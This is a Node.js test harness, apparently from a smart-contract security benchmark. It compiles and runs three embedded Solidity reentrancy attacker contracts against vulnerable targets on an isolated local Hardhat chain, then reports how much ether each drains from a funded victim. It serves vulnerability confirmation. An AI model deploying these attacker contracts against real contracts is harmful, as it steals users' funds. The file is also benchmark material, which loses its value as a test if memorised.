'use strict';

const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');

const root = process.env.CAMPAIGN_PROJECT_ROOT || path.resolve(__dirname, '..');
const deps = path.join(root, 'flare-scan/contracts/firelight-core/node_modules');
process.env.HARDHAT_CONFIG = path.join(root, 'scripts/local-test-hardhat.cjs');
const hre = require(path.join(deps, 'hardhat'));
const { BrowserProvider, ContractFactory } = require(path.join(deps, 'ethers'));
const solcLoader = require(path.join(root, 'flare-scan/tools/solc-0819/node_modules/solc'));
const solc = solcLoader.setupMethods(require(process.env.CAMPAIGN_SOLJSON));
const { LOCAL_CHAIN_ID, parseForkConfig, publicBoundary } = require('./dynamic-execution-boundary.cjs');

const caseId = process.argv[2];
const sourcePath = path.resolve(process.argv[3] || '');
const sourceName = path.basename(sourcePath);
const source = fs.readFileSync(sourcePath, 'utf8');
const sourceSha256 = digest(source);
const compilerRelease = String(process.env.BENCHMARK_SOLC_VERSION || '').split('+', 1)[0];
if (!/^\d+\.\d+\.\d+$/.test(compilerRelease)) throw new Error('benchmark_compiler_version_missing_or_invalid');

const attackerSources = {
  '14-reentrance': `pragma solidity ${compilerRelease};
interface IReentrance {
  function donate(address to) public payable;
  function withdraw(uint amount) public;
}
contract ReentranceAttacker {
  IReentrance public target;
  uint public rounds;
  function ReentranceAttacker(address targetAddress) public { target = IReentrance(targetAddress); }
  function seed() public payable { target.donate.value(msg.value)(address(this)); }
  function attack(uint amount) public { target.withdraw(amount); }
  function() public payable { if (rounds < 4) { rounds += 1; target.withdraw(1 ether); } }
}`,
  '15-reentrancy_simple': `pragma solidity ${compilerRelease};
interface ISimpleReentrance {
  function addToBalance() public payable;
  function withdrawBalance() public;
}
contract SimpleReentranceAttacker {
  ISimpleReentrance public target;
  uint public rounds;
  function SimpleReentranceAttacker(address targetAddress) public { target = ISimpleReentrance(targetAddress); }
  function seed() public payable { target.addToBalance.value(msg.value)(); }
  function attack() public { target.withdrawBalance(); }
  function() public payable { if (rounds < 1) { rounds += 1; target.withdrawBalance(); } }
}`,
  '20-reentrancy_cross_function': `pragma solidity ${compilerRelease};
interface IPersonalBank {
  function Deposit() public payable;
  function Collect(uint amount) public payable;
}
contract CrossFunctionReentrancyAttacker {
  IPersonalBank public target;
  uint public rounds;
  function CrossFunctionReentrancyAttacker(address targetAddress) public { target = IPersonalBank(targetAddress); }
  function seed() public payable { target.Deposit.value(msg.value)(); }
  function attack() public { target.Collect(1 ether); }
  function() public payable {
    if (rounds < 3) {
      rounds += 1;
      target.Deposit.value(msg.value / 2)();
      target.Collect(1 ether);
    }
  }
}`,
};
const attacker = attackerSources[caseId];
if (!attacker) throw new Error(`unsupported_dynamic_case:${caseId}`);
const attackerContractName = caseId === '14-reentrance'
  ? 'ReentranceAttacker'
  : caseId === '15-reentrancy_simple'
    ? 'SimpleReentranceAttacker'
    : 'CrossFunctionReentrancyAttacker';

function digest(value) { return crypto.createHash('sha256').update(value).digest('hex'); }

(async () => {
  const fork = parseForkConfig(process.env);
  if (fork.requested || !fork.valid) throw new Error('benchmark_dynamic_requires_isolated_local_evm');
  const sources = { [sourceName]: { content: source }, 'PoCAttacker.sol': { content: attacker } };
  const input = { language: 'Solidity', sources, settings: { optimizer: { enabled: false }, outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } } } };
  const compiled = JSON.parse(solc.compile(JSON.stringify(input)));
  const errors = (compiled.errors || []).filter((item) => item.severity === 'error');
  if (errors.length) throw new Error(`original_source_compile_failed:${errors.map((item) => item.formattedMessage).join('\n')}`);
  const contractEntry = compiled.contracts[sourceName] && (caseId === '20-reentrancy_cross_function'
    ? compiled.contracts[sourceName].PERSONAL_BANK
    : Object.values(compiled.contracts[sourceName])[0]);
  const attackerEntry = compiled.contracts['PoCAttacker.sol'] && compiled.contracts['PoCAttacker.sol'][attackerContractName];
  if (!contractEntry || !attackerEntry) throw new Error('benchmark_contract_artifact_missing');

  if (hre.network.name !== 'hardhat' || hre.network.config.url || hre.network.config.forking) throw new Error('benchmark_evm_not_isolated');
  const provider = new BrowserProvider(hre.network.provider);
  const chainId = Number((await provider.getNetwork()).chainId);
  if (chainId !== LOCAL_CHAIN_ID) throw new Error('benchmark_evm_chain_id_mismatch');
  const attackerSigner = await provider.getSigner(0);
  const funder = await provider.getSigner(1);
  const funderAddress = await funder.getAddress();
  await provider.send('hardhat_setBalance', [funderAddress, '0x8ac7230489e80000']);
  let target;
  if (caseId === '20-reentrancy_cross_function') {
    const logEntry = compiled.contracts[sourceName]?.LogFile;
    if (!logEntry) throw new Error('benchmark_logfile_artifact_missing');
    const logContract = await new ContractFactory(logEntry.abi, logEntry.evm.bytecode.object, attackerSigner).deploy();
    await logContract.waitForDeployment();
    target = await new ContractFactory(contractEntry.abi, contractEntry.evm.bytecode.object, attackerSigner).deploy({ value: 0 });
    await target.waitForDeployment();
    await (await target.getFunction('SetLogFile')(await logContract.getAddress())).wait();
    await (await target.getFunction('Initialized')()).wait();
  } else {
    target = await new ContractFactory(contractEntry.abi, contractEntry.evm.bytecode.object, attackerSigner).deploy({ value: 0 });
    await target.waitForDeployment();
  }
  const targetAddress = await target.getAddress();
  const exploit = await new ContractFactory(attackerEntry.abi, attackerEntry.evm.bytecode.object, attackerSigner).deploy(targetAddress);
  await exploit.waitForDeployment();
  const exploitAddress = await exploit.getAddress();
  const configuredTarget = await exploit.getFunction('target')();
  const seedValue = 1000000000000000000n;
  const victimFunding = 2000000000000000000n;
  const balanceMethod = caseId === '14-reentrance' ? 'balanceOf'
    : caseId === '15-reentrancy_simple' ? 'getBalance' : 'balances';
  const victimFundingReceipt = caseId === '14-reentrance'
    ? await (await target.connect(funder).getFunction('donate')(funderAddress, { value: victimFunding })).wait()
    : caseId === '15-reentrancy_simple'
      ? await (await target.connect(funder).getFunction('addToBalance')({ value: victimFunding })).wait()
      : await (await target.connect(funder).getFunction('Deposit')({ value: victimFunding })).wait();
  const seedReceipt = await (await exploit.seed({ value: seedValue })).wait();
  const beforeBalance = await provider.getBalance(targetAddress, seedReceipt.blockNumber);
  const targetBalances = new (require(path.join(deps, 'ethers')).Contract)(targetAddress,
    caseId === '14-reentrance'
      ? ['function balanceOf(address) view returns (uint256)']
      : caseId === '15-reentrancy_simple'
        ? ['function getBalance(address) view returns (uint256)']
        : ['function balances(address) view returns (uint256)'], attackerSigner);
  const seededBalance = await targetBalances.getFunction(balanceMethod)(exploitAddress);
  const victimCreditBefore = await targetBalances.getFunction(balanceMethod)(funderAddress);
  const attackerBalanceBeforeAttack = await provider.getBalance(exploitAddress);
  let attackError = null;
  let attackReceipt = null;
  try {
    const attack = caseId === '14-reentrance'
      ? exploit.getFunction('attack')(seedValue, { gasLimit: 1000000 })
      : exploit.getFunction('attack')({ gasLimit: 1000000 });
    attackReceipt = await (await attack).wait();
  } catch (error) { attackError = String(error); attackReceipt = error.receipt || null; }
  const afterBalance = await provider.getBalance(targetAddress, attackReceipt.blockNumber);
  const attackerBalanceAfter = await provider.getBalance(exploitAddress, attackReceipt.blockNumber);
  const extracted = attackerBalanceAfter - attackerBalanceBeforeAttack;
  const profit = extracted - seedValue;
  const rounds = await exploit.rounds();
  const remainingCredit = await targetBalances.getFunction(balanceMethod)(exploitAddress);
  const victimCreditAfter = await targetBalances.getFunction(balanceMethod)(funderAddress);
  const trace = attackReceipt?.hash ? await hre.network.provider.send('debug_traceTransaction', [attackReceipt.hash, { disableMemory: true, disableStorage: true, disableStack: false }]) : null;
  const callTrace = (trace?.structLogs || []).filter((item) => ['CALL', 'STATICCALL', 'DELEGATECALL'].includes(item.op)).map((item) => ({ op: item.op, depth: item.depth, stack: (item.stack || []).slice(-4) }));
  const expectedAfterBalance = caseId === '14-reentrance' ? 0n
    : caseId === '15-reentrancy_simple' ? 1000000000000000000n : 500000000000000000n;
  const confirmed = attackReceipt?.status === 1
    && beforeBalance === seedValue + victimFunding
    && afterBalance === expectedAfterBalance
    && extracted > seedValue
    && profit > 0n
    && victimCreditBefore === victimFunding
    && victimCreditAfter === victimFunding;
  const boundary = publicBoundary(fork, { chainId, forkState: 'not_performed' });
  const result = {
    schemaVersion: 1, state: confirmed ? 'passed' : 'failed', confirmedVulnerability: confirmed,
    caseId, vulnerability: 'reentrancy', mode: 'isolated_in_process',
    compilerVersion: solc.version(), compilerKind: 'solc-js-original-source', sourceSha256,
    compilerArtifactSha256: process.env.BENCHMARK_SOLC_SHA256 || null,
    executionBundleSha256: digest(JSON.stringify(Object.fromEntries(Object.entries(sources).sort().map(([name, item]) => [name, item.content])))),
    attackerSourceSha256: digest(attacker), beforeTargetBalanceWei: beforeBalance.toString(),
    afterTargetBalanceWei: afterBalance.toString(), attackerBalanceWei: attackerBalanceAfter.toString(),
    attackerBalanceBeforeAttackWei: attackerBalanceBeforeAttack.toString(), extractedWei: extracted.toString(),
    profitWei: profit.toString(), victimAddress: funderAddress, victimFundingWei: victimFunding.toString(),
    victimFundingTransactionHash: victimFundingReceipt.hash, victimCreditBeforeWei: victimCreditBefore.toString(),
    victimCreditAfterWei: victimCreditAfter.toString(), seedTransactionHash: seedReceipt.hash,
    seededBalanceWei: seededBalance.toString(), remainingCreditWei: remainingCredit.toString(),
    rounds: rounds.toString(), configuredTarget, attackError, attackStatus: attackReceipt?.status ?? null, callTrace,
    executionBoundary: boundary,
    reason: confirmed ? null : 'reentrancy_profit_or_victim_credit_assertion_failed',
    reproduction: caseId === '14-reentrance'
      ? '在隔离 EVM 中由受害者存入 2 ETH、攻击合约存入 1 ETH；重入 withdraw(1 ETH)，验证受害者仍有 2 ETH 账面余额而目标合约被清空，攻击者获利 2 ETH。'
      : caseId === '15-reentrancy_simple'
        ? '在隔离 EVM 中由受害者存入 2 ETH、攻击合约存入 1 ETH；重入 withdrawBalance，验证攻击者提取 2 ETH、获利 1 ETH，受害者仍有 2 ETH 账面余额而合约仅剩 1 ETH。'
        : '在隔离 EVM 中由受害者存入 2 ETH、攻击合约存入 1 ETH；提款回调中重复存入部分到账资金并再次 Collect，验证跨函数重入让攻击者净赚 1.5 ETH，受害者仍有 2 ETH 账面余额而目标合约仅剩 0.5 ETH。',
  };
  process.stdout.write(`${JSON.stringify(result)}\n`);
  if (!confirmed) process.exitCode = 1;
})().catch((error) => {
  process.stderr.write(`${error.stack || error}\n`);
  process.exitCode = 1;
});
